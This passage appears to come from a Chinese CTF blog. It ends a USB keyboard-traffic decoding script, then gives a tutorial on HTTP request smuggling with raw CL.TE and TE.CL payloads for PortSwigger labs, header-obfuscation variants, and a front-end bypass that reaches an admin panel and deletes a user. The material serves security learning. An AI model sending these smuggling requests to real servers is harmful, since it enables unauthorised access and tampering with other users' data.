press == <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-keyword">in</span> press:<br>            Bytes = press.split(<span class="hljs-string">&quot;:&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            Bytes = [press[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(press), <span class="hljs-number">2</span>)]<br>        <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;00&quot;</span>:<br>            <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">2</span>] != <span class="hljs-string">&quot;00&quot;</span> <span class="hljs-keyword">and</span> normalKeys.get(Bytes[<span class="hljs-number">2</span>]):<br>                result += normalKeys[Bytes[<span class="hljs-number">2</span>]]<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">int</span>(Bytes[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0b10</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span>(Bytes[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0b100000</span>: <span class="hljs-comment"># shift key is pressed.</span><br>            <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">2</span>] != <span class="hljs-string">&quot;00&quot;</span> <span class="hljs-keyword">and</span> normalKeys.get(Bytes[<span class="hljs-number">2</span>]):<br>                result += shiftKeys[Bytes[<span class="hljs-number">2</span>]]<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&quot;[-] Unknow Key : %s&quot;</span> % (Bytes[<span class="hljs-number">0</span>]))<br>    print(<span class="hljs-string">&quot;[+] Found : %s&quot;</span> % (result))<br><br>    <span class="hljs-comment"># clean the temp data</span><br>    os.system(<span class="hljs-string">&quot;rm ./%s&quot;</span> % (DataFileName))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>运行脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ python3 UsbKeyboardDataHacker.py key.pcap                                                                                        1 ⨯<br>[-] Unknow Key : 01<br>[-] Unknow Key : 01<br>[+] Found : aababacbbdbdccccdcdcdbbcccbcbbcbbaababaaaaaaaaaaaaaaaaaakey&#123;xinan&#125;<br></code></pre></td></tr></table></figure><hr><p>参考文章：<br><a href="https://blog.csdn.net/qq_45555226/article/details/102810474">https://blog.csdn.net/qq_45555226/article/details/102810474</a><br><a href="https://github.com/WangYihang/UsbMiceDataHacker">https://github.com/WangYihang/UsbMiceDataHacker</a><br><a href="https://blog.csdn.net/qq_43431158/article/details/108717829">https://blog.csdn.net/qq_43431158/article/details/108717829</a></p><p>CTF流量分析总结题目：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://pan.baidu.com/s/1bGEIPeXDCbhybmWOyGr8Og<span class="hljs-comment">#list/path=%2F</span><br>提取码：q6ro<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：USB流量分析&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="MISC" scheme="http://atkx.top/categories/CTF/MISC/"/>
    
    
    <category term="流量分析" scheme="http://atkx.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>HTTP请求走私漏洞</title>
    <link href="http://atkx.top/2021/04/11/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E/"/>
    <id>http://atkx.top/2021/04/11/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-04-11T13:52:10.000Z</published>
    <updated>2021-08-15T03:59:06.553Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：HTTP请求走私漏洞学习</p> <a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在做一道题的时候，在大师傅的wp中发现可以利用HTTP请求走私漏洞绕过WAF,联想到hgame2021也有类似的题，当时连wp都看不懂，直接使用官方wp的Payload，也不能得到结果，现在来总结一下。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。请求走私漏洞本质上通常很关键，它使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。</p><ul><li>利用Content-Length字段来判定请求体的内容长度 </li><li>利用Transfer-Encoding字段来判定请求体的结束位置</li></ul><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h3><p>Content-Length即为实体长度。浏览器可以通过 Content-Length 的长度信息，判断出响应实体已结束。通常如果 Content-Length 比实际长度短，会造成内容被截断；如果比实体内容长，会造成 pending。</p><h3 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h3><p>历史上 Transfer-Encoding 可以有多种取值，但最新的 HTTP 规范里，只定义了一种传输编码：分块编码（chunked）。</p><p>分块编码相当简单，在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，报文中的实体需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的 CRLF（\r\n），也不包括分块数据结尾的 CRLF。最后一个分块长度值必须为 0，对应的分块数据没有内容，表示实体结束。</p><h3 id="CL与TE解析优先级顺序"><a href="#CL与TE解析优先级顺序" class="headerlink" title="CL与TE解析优先级顺序"></a>CL与TE解析优先级顺序</h3><p>CL表示Content-Length，TE表示Transfer-Encoding。</p><p>优先级顺序详见 <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">RFC7230 section 3.3.3 </a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">If</span> a message <span class="hljs-keyword">is</span> received <span class="hljs-keyword">with</span> <span class="hljs-keyword">both</span> a Transfer-<span class="hljs-keyword">Encoding</span> <span class="hljs-keyword">and</span> a<br>Content-Length <span class="hljs-keyword">header</span> field, the Transfer-<span class="hljs-keyword">Encoding</span> overrides the<br>Content-Length. Such a message might indicate an attempt <span class="hljs-keyword">to</span> <span class="hljs-keyword">perform</span><br>request smuggling (Section <span class="hljs-number">9.5</span>) <span class="hljs-keyword">or</span> response splitting (Section <span class="hljs-number">9.4</span>)<br><span class="hljs-keyword">and</span> ought <span class="hljs-keyword">to</span> be handled <span class="hljs-keyword">as</span> an error. A sender MUST remove the received Content-Length field prior <span class="hljs-keyword">to</span> forwarding such a message downstream.<br></code></pre></td></tr></table></figure><p>TE 优先于 CL ，但可以通过一些方式绕过</p><h2 id="请求走私分类"><a href="#请求走私分类" class="headerlink" title="请求走私分类"></a>请求走私分类</h2><p>请求走私攻击包括将Content-Length标头和Transfer-Encoding 标头都放入单个HTTP请求中并进行处理，以便前端服务器和后端服务器以不同的方式处理请求。完成此操作的确切方式取决于两个服务器的行为：</p><ul><li>CL不为0:前端代理服务器允许请求携带请求体，而后端服务器不允许请求携带请求体。</li><li>CL-CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</li><li>CL-TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer- Encoding标头。</li><li>TE-TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过某种方式混淆标头来诱导其中一台服务器不对其进行处理。</li><li>TE-CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</li></ul><h3 id="CL不为0"><a href="#CL不为0" class="headerlink" title="CL不为0"></a>CL不为0</h3><p>所有不携带请求体的HTTP请求都有可能受此影响,这里以GET请求为例。</p><p>当前端服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的<code>Content-Length</code>头，不进行处理。这就有可能导致请求走私。</p><p>比如构造请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>Content-Length: 44\r\n<br>\r\n<br>GET /secret HTTP/1.1\r\n<br>Host: demo.com\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p><strong>注：\r\n表示 CRLF即换行</strong></p><p>前端服务器处理了Content-Length，而后端服务器没有处理 Content-Length ，基于pipeline机制认为这是两个独立的请求：</p><p>第一个请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET / HTTP/1.1\r\n<br>Host: demo.com\r\n<br></code></pre></td></tr></table></figure><p>第二个请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /secret HTTP/1.1\r\n<br>Host: demo.com\r\n<br></code></pre></td></tr></table></figure><h3 id="CL-CL漏洞"><a href="#CL-CL漏洞" class="headerlink" title="CL-CL漏洞"></a>CL-CL漏洞</h3><p><strong>RFC7230规范</strong>：在RFC7230的<a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">第3.3.3节</a>中的第四条中，规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误。</p><p>构造请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>Content-Length: 5\r\n<br>Content-Length: 6\r\n<br>\r\n<br>12345\r\n<br>a<br></code></pre></td></tr></table></figure><p>得到响应，返回400 Bad Request<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185910-522340.png" alt="2"><br><strong>触发过程</strong></p><p>但是总有服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个Content-Length的值对请求进行处理，而后端源站服务器按照第二个Content-Length的值进行处理。</p><h3 id="CL-TE漏洞"><a href="#CL-TE漏洞" class="headerlink" title="CL-TE漏洞"></a>CL-TE漏洞</h3><p>CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理Content-Length请求头，而后端服务器会遵守RFC2616的规定，忽略掉Content-Length，处理Transfer-Encoding请求头。</p><p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">CL.TE实验环境</a></p><blockquote><p>实验描述：<br>本实验涉及前端和后端服务器，并且前端服务器不支持分块编码（Transfer-Encoding解析），前端服务器拒绝未使用GET或POST方法之外的请求。</p><p>实验要求：<br>将请求走私到后端服务器，以便后端服务器处理的下一个请求像是使用了GPOST方法。</p></blockquote><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185934-758668.png" alt="labs1"><br>点击Access the lab，跳转新的页面，在新的页面进行抓包<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190020-357686.png" alt="1"><br>将请求行中请求方式修改为POST,在请求行添加Transfer-<code>Encoding: chunked</code>，然后在实体中添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">0\r\n<br>\r\n<br>G\r\n<br></code></pre></td></tr></table></figure><p>连续发送两次请求就可以获得响应。<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190033-562357.png" alt="2"><br>分析：连续请求，G会被带入下一个请求，变为 <code>GPOST / HTTP/1.1\r\n</code></p><p><strong>触发过程</strong></p><p>前端服务器处理Content-Length头并确定请求主体长度为6个字节</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">0\r\n<br>\r\n<br>G<br></code></pre></td></tr></table></figure><p>此请求经过代理服务器转发给后端服务器时，后端服务器处理Transfer-Encoding，当它读取到<code>0\r\n\r\n</code>时，会被认为已经读取到结尾了，但是剩下的字母G就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，G会被带入下一个请求，发送的请求在后端服务器变为 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">GPOST / HTTP/1.1\r\n<br></code></pre></td></tr></table></figure><p>服务器在解析时会产生报错</p><h3 id="TE-TE漏洞"><a href="#TE-TE漏洞" class="headerlink" title="TE-TE漏洞"></a>TE-TE漏洞</h3><p>在这里，前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。</p><p>详见 <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">RFC7230 section 3.3.3.3</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">If a Transfer-Encoding header field is present <span class="hljs-keyword">in</span> a response and<br>the chunked transfer coding is not the final encoding, the<br>message body length is determined by reading the connection until<br>it is closed by the server.  If a Transfer-Encoding header field<br>is present <span class="hljs-keyword">in</span> a request and the chunked transfer coding is not<br>the final encoding, the message body length cannot be determined<br>reliably; the server MUST respond with the 400 (Bad Request)<br>status code and <span class="hljs-keyword">then</span> close the connection.<br></code></pre></td></tr></table></figure><p>这里列出七种混淆方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">Transfer-Encoding: xchunked<br><br>Transfer-Encoding : chunked<br><br>Transfer-Encoding: x<br><br>Transfer-Encoding:[tab]chunked<br><br>[space]Transfer-Encoding: chunked<br><br>X: X[\n]Transfer-Encoding: chunked<br><br>Transfer-Encoding<br>: chunked<br></code></pre></td></tr></table></figure><p>之所以在处理这些请求头时会出现问题，是因为在实际的HTTP协议实现中，很少有代码精确的遵循了其中的规范，以此导致面对变形的请求头时会出现不同的处理方式。而我们所要做的就是找到其中存在问题的服务器，然后使用类似前两个情形的攻击报文走私数据。</p><p><a href="https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header">TE.TE验环境</a><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185807-72744.png" alt="QQ截图20210406190848"><br>构造请求，注意同样需要去掉勾选Update Content-Length</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>Content-length: 4\r\n<br>Transfer-Encoding: chunked\r\n<br>Transfer-encoding: cow\r\n<br>\r\n<br>5c\r\n<br>GPOST / HTTP/1.1\r\n<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 15\r\n<br>\r\n<br>x=1\r\n<br>0\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>连续发送两次请求<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190116-607083.png" alt="2"></p><p>分析：前端将body的内容视为正常请求，到了后端，因为<code>Transfer-encoding: cow</code>无法识别，将会转而使用<code>Content-length: 4</code>，从而产生报错</p><h3 id="TE-CL漏洞"><a href="#TE-CL漏洞" class="headerlink" title="TE-CL漏洞"></a>TE-CL漏洞</h3><p>所谓TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理Transfer-Encoding这一请求头，而后端服务器处理Content-Length请求头。</p><p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">TE.CL验环境</a><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190225-786616.png" alt="timu"><br>点击Access the lab，跳转新的页面，在新的页面进行抓包<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190234-493978.png" alt="1"><br>进入实验，首先需要去掉勾选Update Content-Length防止Buprsuite自动更新Content-Length字段<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190250-681892.png" alt="0"><br>构造请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>......<br>Transfer-Encoding: chunked\r\n<br>Content-Length: 3\r\n<br>\r\n<br>1\r\n<br>G\r\n<br>0\r\n<br>\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>连续发送两次请求得到响应<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190306-543465.png" alt="2"><br>G和0被走私了，带入了带入下一个请求，响应报文请求方法是G0POST，我们需要完整构造GPOST报文请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>Content-Length: 4\r\n<br>Transfer-Encoding: chunked\r\n<br>\r\n<br>12\r\n<br>GPOST / HTTP/1.1\r\n<br>\r\n<br>0\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>连续请求两次<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190317-764210.png" alt="3"></p><p>官方提供的方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: your-lab-id.web-security-academy.net\r\n<br>Content-length: 4\r\n<br>Transfer-Encoding: chunked\r\n<br>\r\n<br>5c\r\n<br>GPOST / HTTP/1.1\r\n<br>Content-Type: application/x-www-form-urlencoded\r\n<br>Content-Length: 15\r\n<br>\r\n<br>x=1\r\n<br>0\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>得到响应<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190337-171562.png" alt="4"><br><strong>触发过程</strong><br>由于前端服务器处理Transfer-Encoding，当其读取到0\r\n\r\n时，认为是读取完毕了，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理Content-Length请求头，当它读取完12\r\n之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">GPOST / HTTP/1.1\r\n<br>\r\n<br>0\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>成功报错。</p><p>前端服务器处理Transfer-Encoding标头，因此将消息正文视为使用分块编码。它处理第一个块，声明为12个字节长，直到下一行的开始<code>GPOST / HTTP/1.1</code>。它处理第二个数据块，该数据块的长度为零，因此被视为终止请求。该请求被转发到后端服务器。</p><p>后端服务器处理Content-Length标头，并确定请求主体的长度为4个字节，直到下一行的开始12。以下以开头的字节<code>GPOST / HTTP/1.1</code>未处理，后端服务器会将其视为序列中下一个请求的开始。</p><h2 id="绕过前端服务器安全控制"><a href="#绕过前端服务器安全控制" class="headerlink" title="绕过前端服务器安全控制"></a>绕过前端服务器安全控制</h2><blockquote><p>实验描述：</p><p>本实验涉及前端和后端服务器，并且前端服务器不支持分块编码。处有一个管理面板/admin，但是前端服务器禁止访问它。</p><p>要解决此问题，请将请求走私到访问管理面板并删除用户的后端服务器carlos。</p></blockquote><h3 id="利用CL-TE漏洞绕过"><a href="#利用CL-TE漏洞绕过" class="headerlink" title="利用CL-TE漏洞绕过"></a>利用CL-TE漏洞绕过</h3><p><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">实验环境</a></p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190419-108405.png" alt="timu"></p><blockquote><p>实验描述：</p><p>本实验涉及前端和后端服务器，并且前端服务器不支持分块编码。处有一个管理面板/admin，但是前端服务器禁止访问它。</p><p>要解决此问题，请将请求走私到访问管理面板并删除用户的后端服务器carlos。</p></blockquote><p>按照要求访问管理面板/admin，会提示Path /admin is blocked</p><p>利用CL-TE漏洞，构造数据包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Length: 37<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin HTTP/1.1<br>X-Ignore: X<br></code></pre></td></tr></table></figure><p>发现只能本地用户查看<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190431-281494.png" alt="1"><br>连续两次发出以下请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Length: 54<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin HTTP/1.1<br>Host: localhost<br>X-Ignore: X<br></code></pre></td></tr></table></figure><p>观察到由于第二个请求的Host标头与第一个请求中的走私Host标头冲突，该请求被阻止。<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190443-9518.png" alt="2"><br>两次发出以下请求，以便将第二个请求的标头附加到走私的请求正文中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Length: 116<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin HTTP/1.1<br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 10<br><br>x=<br></code></pre></td></tr></table></figure><p>现在可以访问管理面板</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190458-985555.png" alt="3"><br>根据响应内容，更改走私的请求URL以删除用户carlos：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Length: 139<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin/delete?username=carlos HTTP/1.1<br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 10<br><br>x=<br></code></pre></td></tr></table></figure><p>没有回显内容，使用上个数据包访问管理面板，验证是否删除成功<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190522-947042.png" alt="5"></p><h3 id="利用TE-CL漏洞绕过"><a href="#利用TE-CL漏洞绕过" class="headerlink" title="利用TE-CL漏洞绕过"></a>利用TE-CL漏洞绕过</h3><p><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">实验环境</a><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190536-739950.png" alt="题目"><br>这次利用TE-CL漏洞，构造数据包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-length: 4<br>Transfer-Encoding: chunked<br><br>60<br>POST /admin HTTP/1.1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 15<br><br>x=1<br>0\r\n<br>\r\n<br>\r\n<br><br></code></pre></td></tr></table></figure><p>允许本地查看<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190544-763227.png" alt="1"><br>两次发出以下请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Type: application/x-www-form-urlencoded<br>Content-length: 4<br>Transfer-Encoding: chunked<br><br>71<br>POST /admin HTTP/1.1<br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 15<br><br>x=1<br>0\r\n<br>\r\n<br>\r\n<br><br></code></pre></td></tr></table></figure><p>成功访问管理员页面<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190552-248001.png" alt="2"><br>更改走私的请求URL以删除用户carlos：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-length: 4<br>Transfer-Encoding: chunked<br><br>87<br>GET /admin/delete?username=carlos HTTP/1.1<br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 15<br><br>x=1<br>0\r\n<br>\r\n<br>\r\n<br><br></code></pre></td></tr></table></figure><p>访问管理员页面验证是否删除</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190623-841809.png" alt="3"></p><h2 id="CTF中的请求走私"><a href="#CTF中的请求走私" class="headerlink" title="CTF中的请求走私"></a>CTF中的请求走私</h2><p><strong>HGAME2021-宝藏走私者</strong></p><p>hint: 注意留意服务器信息<br>资料：<a href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a><br>宝藏走私者 Switch 喜欢偷盗并将奇特的宝藏走私到一些黑市商家手中。<br>为了阻止其继续作恶，警探 Liki 奉命将 Switch 抓捕归案。<br>调查过程中，Liki 发现 Switch 将一个秘密藏在了一个私人服务器中。<br>这或许会成为后续追查 Switch 的重大线索，你能找到这个秘密吗？<br><img src="https://img-blog.csdnimg.cn/20210206224207823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" 